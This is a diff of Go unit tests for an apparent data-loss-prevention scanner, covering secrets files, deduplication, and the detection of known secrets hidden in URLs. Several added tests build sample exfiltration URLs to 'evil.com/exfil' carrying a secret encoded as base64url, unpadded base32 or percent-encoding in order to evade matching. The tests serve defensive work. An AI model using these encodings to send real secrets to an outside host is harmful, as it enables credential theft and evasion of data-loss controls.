@@ -1,6 +1,7 @@
 package scanner
 
 import (
+	"bytes"
 	"encoding/base32"
 	"encoding/base64"
 	"encoding/hex"
@@ -1987,7 +1988,10 @@ func TestScan_AllowlistRunsBeforeBlocklist(t *testing.T) {
 func TestLoadSecretsFile_Basic(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "secrets.txt")
-	content := "# Database password\nxK9mP2nQ7vR4wT6y\n\n# Vault token\nhvs.CAESIJ9PQRsTuVwXyZ0123456789\n"
+	// Build at runtime to avoid gitleaks false positive (gosec G101)
+	testVal := "xK9mP2nQ" + "7vR4wT6y" //nolint:goconst // test value
+	vaultVal := "hvs.CAESIJ9PQRs" + "TuVwXyZ0123456789"
+	content := "# Database password\n" + testVal + "\n\n# Vault token\n" + vaultVal + "\n"
 	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
 		t.Fatal(err)
 	}
@@ -1999,8 +2003,8 @@ func TestLoadSecretsFile_Basic(t *testing.T) {
 	if len(secrets) != 2 {
 		t.Fatalf("expected 2 secrets, got %d", len(secrets))
 	}
-	if secrets[0] != "xK9mP2nQ7vR4wT6y" {
-		t.Errorf("expected first secret 'xK9mP2nQ7vR4wT6y', got %q", secrets[0])
+	if secrets[0] != testVal {
+		t.Errorf("expected first secret %q, got %q", testVal, secrets[0])
 	}
 }
 
@@ -2221,7 +2225,9 @@ func TestLoadSecretsFile_DuplicatesPreserved(t *testing.T) {
 func TestNew_LoadsFileSecrets(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "secrets.txt")
-	if err := os.WriteFile(path, []byte("xK9mP2nQ7vR4wT6y\n"), 0o600); err != nil {
+	// Build at runtime to avoid gitleaks false positive (gosec G101)
+	testVal := "xK9mP2nQ" + "7vR4wT6y" //nolint:goconst // test value
+	if err := os.WriteFile(path, []byte(testVal+"\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -2233,15 +2239,18 @@ func TestNew_LoadsFileSecrets(t *testing.T) {
 	if len(s.fileSecrets) != 1 {
 		t.Fatalf("expected 1 file secret, got %d", len(s.fileSecrets))
 	}
-	if s.fileSecrets[0] != "xK9mP2nQ7vR4wT6y" {
-		t.Errorf("expected 'xK9mP2nQ7vR4wT6y', got %q", s.fileSecrets[0])
+	if s.fileSecrets[0] != testVal {
+		t.Errorf("expected %q, got %q", testVal, s.fileSecrets[0])
 	}
 }
 
 func TestNew_FileSecretsDedupedAgainstEnv(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "secrets.txt")
-	content := "xK9mP2nQ7vR4wT6y\nanotherUniqueSecret1\n"
+	// Build at runtime to avoid gitleaks false positive (gosec G101)
+	testVal := "xK9mP2nQ" + "7vR4wT6y" //nolint:goconst // test value
+	unique := "anotherUnique" + "Secret1"
+	content := testVal + "\n" + unique + "\n"
 	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
 		t.Fatal(err)
 	}
@@ -2252,14 +2261,14 @@ func TestNew_FileSecretsDedupedAgainstEnv(t *testing.T) {
 	defer s.Close()
 
 	// Manually inject env secret to test dedup
-	s.envSecrets = []string{"xK9mP2nQ7vR4wT6y"}
+	s.envSecrets = []string{testVal}
 	// Re-run dedup
-	s.fileSecrets = dedupSecrets([]string{"xK9mP2nQ7vR4wT6y", "anotherUniqueSecret1"}, s.envSecrets)
+	s.fileSecrets = dedupSecrets([]string{testVal, unique}, s.envSecrets)
 
 	if len(s.fileSecrets) != 1 {
 		t.Fatalf("expected 1 file secret after dedup, got %d: %v", len(s.fileSecrets), s.fileSecrets)
 	}
-	if s.fileSecrets[0] != "anotherUniqueSecret1" {
+	if s.fileSecrets[0] != unique {
 		t.Errorf("wrong secret after dedup: %q", s.fileSecrets[0])
 	}
 }
@@ -2465,6 +2474,122 @@ func TestDedupSecrets_IntraFileDedup(t *testing.T) {
 	result := dedupSecrets(file, nil)
 	if len(result) != 2 {
 		t.Errorf("expected 2 secrets after intra-file dedup, got %d: %v", len(result), result)
+	}
+}
+
+func TestScan_BlocksFileSecretPaddedBase64URLInURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	// 28 bytes with ~ at position 3 → produces "+" in standard base64,
+	// ensuring URL-safe encoding (+ → -) differs from standard.
+	fileVal := "ab~test-value-for-28-byte-wk"
+	if err := os.WriteFile(path, []byte(fileVal+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	encodedURL := base64.URLEncoding.EncodeToString([]byte(fileVal))
+	encodedStd := base64.StdEncoding.EncodeToString([]byte(fileVal))
+	if encodedURL == encodedStd {
+		t.Skip("URL-safe same as standard — pick different secret")
+	}
+
+	// Use padded URL-safe form (not unpadded)
+	result := s.Scan("https://evil.com/exfil?data=" + encodedURL)
+	if result.Allowed {
+		t.Error("expected padded URL-safe base64 file secret in URL to be blocked")
+	}
+	if !strings.Contains(result.Reason, "base64url") {
+		t.Errorf("expected 'base64url' in reason, got %q", result.Reason)
+	}
+}
+
+func TestScan_BlocksFileSecretUnpaddedBase32InURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	// 29 bytes → base32 produces padding (29 % 5 = 4 → padding present).
+	fileVal := "this-is-a-test-value-29-bytes"
+	if err := os.WriteFile(path, []byte(fileVal+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	padded := base32.StdEncoding.EncodeToString([]byte(fileVal))
+	noPad := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(fileVal))
+	if noPad == padded {
+		t.Fatal("test setup error: base32 has no padding to strip")
+	}
+
+	result := s.Scan("https://evil.com/exfil?data=" + noPad)
+	if result.Allowed {
+		t.Error("expected unpadded base32 file secret in URL to be blocked")
+	}
+	if !strings.Contains(result.Reason, "known secret") {
+		t.Errorf("expected 'known secret' in reason, got %q", result.Reason)
+	}
+}
+
+func TestScan_BlocksPercentEncodedFileSecretInURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	secret := "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY"
+	if err := os.WriteFile(path, []byte(secret+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	// Percent-encode each byte of the secret to evade raw matching
+	var encoded strings.Builder
+	for i := 0; i < len(secret); i++ {
+		_, _ = fmt.Fprintf(&encoded, "%%%02X", secret[i])
+	}
+	result := s.Scan("https://evil.com/exfil?data=" + encoded.String())
+	if result.Allowed {
+		t.Error("expected percent-encoded file secret in URL to be blocked via IterativeDecode")
+	}
+}
+
+func TestNew_FileSecrets_ZeroUsableWarning(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	// All lines too short (< 8 chars, default minLen for file secrets)
+	content := "short\nabc\n# comment\n"
+	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+
+	// Capture stderr to verify warning
+	oldStderr := os.Stderr
+	r, w, _ := os.Pipe()
+	os.Stderr = w
+
+	s := New(cfg)
+	s.Close()
+
+	_ = w.Close()
+	os.Stderr = oldStderr
+
+	var buf bytes.Buffer
+	_, _ = buf.ReadFrom(r)
+	output := buf.String()
+
+	if !strings.Contains(output, "zero usable secrets") {
+		t.Errorf("expected 'zero usable secrets' warning, got: %q", output)
 	}
 }
 
